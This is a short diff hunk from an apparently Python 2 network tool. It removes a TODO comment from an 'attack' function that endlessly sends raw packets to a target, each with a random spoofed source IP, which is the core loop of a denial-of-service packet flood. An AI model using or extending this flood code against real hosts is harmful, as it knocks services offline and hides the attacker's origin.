@@ -179,7 +179,6 @@ def receivemessage(socket):
 
 def attack(raw_socket,attack_type, local_ip, dest_ip, dest_port):
     print "=== " + local_ip + " Attacking " + dest_ip + " on " + dest_port + " ==="
-    # TODO: Implementar opcao de ataque de acordo com attack_type
     while(1):
         packet = montaPacote(0,attack_type,get_random_ip(), dest_ip,  randint(1800,65533),int(dest_port), 5840, 54321)
         raw_socket.sendto(packet,(dest_ip,0))
